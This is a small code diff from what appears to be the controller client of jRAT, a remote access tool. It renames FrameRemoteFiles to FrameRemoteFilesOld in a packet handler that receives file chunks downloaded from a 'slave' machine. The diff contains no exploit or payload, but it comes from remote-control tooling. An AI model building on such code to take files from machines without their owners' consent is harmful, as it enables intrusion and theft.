@@ -5,7 +5,7 @@ import java.io.File;
 
 import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FrameFileTransfer;
-import se.jrat.client.ui.frames.FrameRemoteFiles;
+import se.jrat.client.ui.frames.FrameRemoteFilesOld;
 import se.jrat.common.io.FileCache;
 import se.jrat.common.io.TransferData;
 
@@ -19,7 +19,7 @@ public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 		byte[] buffer = new byte[len];
 		dis.readFully(buffer);
 		FrameFileTransfer frame = FrameFileTransfer.instance;
-		FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);
+		FrameRemoteFilesOld frame2 = FrameRemoteFilesOld.instances.get(slave);
 		if (frame2 != null) {
 			frame2.start();
 		}
